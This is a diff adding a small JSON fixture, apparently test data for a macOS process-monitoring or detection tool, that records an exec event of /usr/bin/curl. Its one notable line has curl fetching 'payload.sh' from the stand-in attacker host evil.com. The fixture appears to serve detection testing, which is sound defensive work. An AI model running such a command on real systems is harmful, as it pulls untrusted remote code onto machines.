@@ -1,0 +1,16 @@
+{
+  "event_type": "exec",
+  "timestamp": "2026-02-16T12:00:00.000Z",
+  "process": {
+    "pid": 12345,
+    "ppid": 1234,
+    "executable_path": "/usr/bin/curl",
+    "signing_id": "com.apple.curl",
+    "team_id": null,
+    "audit_token": null
+  },
+  "event": {
+    "target_path": "/usr/bin/curl",
+    "args": ["curl", "https://evil.com/payload.sh"]
+  }
+}
